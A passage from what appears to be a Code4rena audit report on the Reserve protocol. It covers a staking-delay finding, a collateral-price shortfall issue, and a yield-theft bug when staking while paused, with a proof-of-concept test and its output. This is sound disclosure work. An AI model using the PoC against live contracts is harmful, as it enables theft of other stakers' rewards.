2)).to.be.revertedWith(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+          &#39;withdrawal unavailable&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      return; // don&#39;t run further test</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       it(&#39;Should revert withdraw if Main is paused&#39;, async () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // Get current balance for user</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         const prevAddr1Balance = await rsr.balanceOf(addr1.address)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -1027,6 +1067,7 @@ describe(`StRSRP${IMPLEMENTATION} contract`, () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  return; // don&#39;t run further test</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   describe(&#39;Add RSR / Rewards&#39;, () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     const initialRate = fp(&#39;1&#39;)</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-17\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-17\" aria-label=\"recommended mitigation steps 17 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Allow users to use current delay even if it was previously higher. I think this should apply not only to new drafts but also for drafts that were created before the change.</p>\n<p>Alternatively, the protocol can set a rule that even if the staking delay was lowered stakers have to wait at least the old delay since the change till they can withdraw.  But in this case the rule should apply to everybody regardless if they have pending drafts or not.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/210#issuecomment-1401184805\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Ultimately this feels like a design tradeoff.  I do agree that the UX would be better if the most recent value was used, but it can cut both ways if the delay is increased. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/210\">0xean (judge) decreased severity to Medium</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/151#issuecomment-1404435948\">pmckelvy1 (Reserve) acknowledged via duplicate issue <code>#151</code></a></strong></p>\n<hr>\n<h2 id=\"m-20-shortfall-might-be-calculated-incorrectly-if-a-price-value-for-one-collateral-isnt-fetched-correctly\" style=\"position:relative;\"><a href=\"#m-20-shortfall-might-be-calculated-incorrectly-if-a-price-value-for-one-collateral-isnt-fetched-correctly\" aria-label=\"m 20 shortfall might be calculated incorrectly if a price value for one collateral isnt fetched correctly permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/200\">[M-20] Shortfall might be calculated incorrectly if a price value for one collateral isn’t fetched correctly</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/200\">severity</a></em></p>\n<p>Function <code>price()</code> of an asset doesn’t revert. It <a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/Asset.sol#L117\">returns values</a> <code>(0, FIX_MAX)</code> for <code>low, high</code> values of price in case there’s a problem with fetching it. Code that calls <code>price()</code> is able to validate returned values to detect that returned price is incorrect.</p>\n<p>Inside function <code>collateralShortfall()</code> of <code>RecollateralizationLibP1</code> <a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L449\">collateral price isn’t checked for correctness</a>. As a result incorrect value of <code>shortfall</code> might be <a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L452\">calculated</a> if there are difficulties to fetch a price for one of the collaterals.</p>\n<h3 id=\"proof-of-concept-19\" style=\"position:relative;\"><a href=\"#proof-of-concept-19\" aria-label=\"proof of concept 19 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L449\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L449</a></p>\n<h3 id=\"recommended-mitigation-steps-18\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-18\" aria-label=\"recommended mitigation steps 18 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Check that price is correctly fetched for a collateral.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/200#issuecomment-1401173756\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Mitigation here is a little challenging to understand considering checking a price is hard on chain and hence the concern. </p>\n<p>I think this issue is a bit too general, but would like further comments. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/200#issuecomment-1404438772\">tbrent (Reserve) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>I think this issue is real, but it happens in a super-corner-case that I doubt the warden is thinking about. </p>\n<p>Some related statements:</p>\n<ul>\n<li><code>prepareRecollateralizationTrade</code> checks that all collateral in the basket is SOUND before calling <code>collateralShortfall</code></li>\n<li>From <code>docs/collateral.md</code>: “Should return <code>(0, FIX_MAX)</code> if pricing data is unavailable or stale.”</li>\n</ul>\n<p><code>collateralShortfall</code> should never reach a collateral with <code>FIX_MAX</code> high price in the normal flow of things.</p>\n<p>But, it is possible for one RToken system instance to have an <code>RTokenAsset</code> registered for a 2nd RToken. In this case, it could be that RToken 2 contains a collateral plugin that is now connected to a broken oracle, but RToken 2 may not have recognized this yet. When RToken 1 calls <code>RTokenAsset.price()</code>, it could end up reverting because of overflow in this line from <code>collateralShortfall</code>:</p>\n<blockquote>\n<p>shortfall = shortfall.plus(needed.minus(held).mul(priceHigh, CEIL));</p>\n</blockquote>\n<p>So I think it’s a real issue, and I would even leave it as Medium severity. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest#mitigations-to-be-reviewed\">tbrent (Reserve) mitigated</a>:</strong></p>\n<blockquote>\n<p>This PR simplifies and improves the basket range formula. The new logic should provide much tighter basket range estimates and result in smaller haircuts.<br>\n<a href=\"https://github.com/reserve-protocol/protocol/pull/585\">reserve-protocol/protocol#585</a></p>\n</blockquote>\n<p><strong>Status:</strong> Mitigation confirmed with comments. Full details in reports from <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/21\">HollaDieWaldfee</a>, <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/63\">0xA5DF</a>, and <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/77\">AkshaySrivastav</a>.</p>\n<hr>\n<h2 id=\"m-21-loss-of-staking-yield-for-stakers-when-another-user-stakes-in-pausefrozen-state\" style=\"position:relative;\"><a href=\"#m-21-loss-of-staking-yield-for-stakers-when-another-user-stakes-in-pausefrozen-state\" aria-label=\"m 21 loss of staking yield for stakers when another user stakes in pausefrozen state permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/148\">[M-21] Loss of staking yield for stakers when another user stakes in pause/frozen state</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/148\">Soosh</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/328\">__141345__</a></em></p>\n<p>It is possible for a user to steal the yield from other stakers by staking when the system is paused or frozen.</p>\n<p>This is because staking is allowed while paused/frozen, but <code>_payoutRewards()</code> is not called during so. Staking rewards are not paid out to current stakers when a new staker stakes, so the new staker immediately gets a portion of the rewards, without having to wait for a reward period.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"sol\" data-index=\"64\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">stake</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rsrAmount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rsrAmount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Cannot stake zero&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">main</span><span class=\"mtk1\">.</span><span class=\"mtk11\">pausedOrFrozen</span><span class=\"mtk1\">()) </span><span class=\"mtk11\">_payoutRewards</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"proof-of-concept-20\" style=\"position:relative;\"><a href=\"#proof-of-concept-20\" aria-label=\"proof of concept 20 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of concept</h3>\n<p>A test case can be included in <code>ZZStRSR.test.ts</code> under ‘Add RSR / Rewards’:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"65\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;Audit: Loss of staking yield for stakers when another user stakes in pause/frozen state&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> () </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rsr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stRSR</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">stake</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stRSR</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">).</span><span class=\"mtk11\">stake</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stake</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">advanceTime</span><span class=\"mtk1\">(</span><span class=\"mtk10\">Number</span><span class=\"mtk1\">(</span><span class=\"mtk12\">config</span><span class=\"mtk1\">.</span><span class=\"mtk12\">rewardPeriod</span><span class=\"mtk1\">) * </span><span class=\"mtk7\">5</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">main</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">pause</span><span class=\"mtk1\">()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rsr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr2</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stRSR</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">stake</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stRSR</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr2</span><span class=\"mtk1\">).</span><span class=\"mtk11\">stake</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stake</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">main</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">unpause</span><span class=\"mtk1\">()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stRSR</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">).</span><span class=\"mtk11\">unstake</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stake</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stRSR</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr2</span><span class=\"mtk1\">).</span><span class=\"mtk11\">unstake</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stake</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">advanceTime</span><span class=\"mtk1\">(</span><span class=\"mtk10\">Number</span><span class=\"mtk1\">(</span><span class=\"mtk12\">config</span><span class=\"mtk1\">.</span><span class=\"mtk12\">unstakingDelay</span><span class=\"mtk1\">) + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stRSR</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">).</span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stRSR</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr2</span><span class=\"mtk1\">).</span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr2</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">addr1RSR</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rsr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">addr2RSR</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rsr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr2</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">`addr1 RSR = </span><span class=\"mtk4\">${</span><span class=\"mtk12\">addr1RSR</span><span class=\"mtk4\">}</span><span class=\"mtk8\">`</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">`addr2 RSR = </span><span class=\"mtk4\">${</span><span class=\"mtk12\">addr2RSR</span><span class=\"mtk4\">}</span><span class=\"mtk8\">`</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk10\">Number</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr1RSR</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approximately</span><span class=\"mtk1\">(</span><span class=\"mtk10\">Number</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr2RSR</span><span class=\"mtk1\">), </span><span class=\"mtk7\">10</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    })</span></span></span></code></pre>\n<p>Note that <code>await advanceTime(Number(config.rewardPeriod) * 5)</code> can be before or after the pause, same result will occur.</p>\n<p>Run with:<br>\n<code>yarn test:p1 --grep \"Audit\"</code></p>\n<p>Output:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"shell\" data-index=\"66\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">addr1 RSR = 10000545505689818061216</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">addr2 RSR = 10000545505689818061214</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  StRSRP1 contract</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    Add RSR / Rewards</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      ✔ Audit: Loss of staking yield for stakers when another user stakes in pause/frozen state (1504ms)                                                                                       (1504ms)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  1 passing (2m)</span></span></code></pre>\n<p>The PoC demonstrates that the staker2 stole half of the rewards from staker1. staker1 staked for 5 <code>rewardPeriod</code>, staker2 did not have to wait at all, but still received half of the reward share.</p>\n<h3 id=\"impact-4\" style=\"position:relative;\"><a href=\"#impact-4\" aria-label=\"impact 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>This should fall into “Theft of unclaimed yield”, suggesting High risk. But the amount of RSR that can be stolen depends on the liveliness of the staking pool (how often <code>_payoutRewards()</code> is called). If the time window between the last <code>stake(...)/unstake(...)/payoutRewards(...)</code> and <code>pause()/freezeUntil(...)</code> is small, then no/less RSR yield can be stolen.</p>\n<p><code>system-design.md</code> rewardPeriod:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"67\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">Default value: `86400` = 1 day</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Mainnet reasonable range: 10 to 31536000 (1 year)</span></span></code></pre>\n<p>For RTokens which choose a smaller value for <code>rewardPeriod</code>, the risk is higher. If <code>rewardPeriod = 86400</code> like recommended, then for this attack to occur, no one must have called <code>stake(...)/unstake(...)/payoutRewards(...)</code> for 1 day before the pause/freeze occured.</p>\n<p>Likelihood is Low for a reasonably set <code>rewardPeriod</code> and lively project. Therefore submitting as Medium risk.</p>\n<h3 id=\"recommendations-1\" style=\"position:relative;\"><a href=\"#recommendations-1\" aria-label=\"recommendations 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendations</h3>\n<p>I’m unsure of why staking is allowed when paused/frozen and the reason for the line:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"sol\" data-index=\"68\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">main</span><span class=\"mtk1\">.</span><span class=\"mtk11\">pausedOrFrozen</span><span class=\"mtk1\">()) </span><span class=\"mtk11\">_payoutRewards</span><span 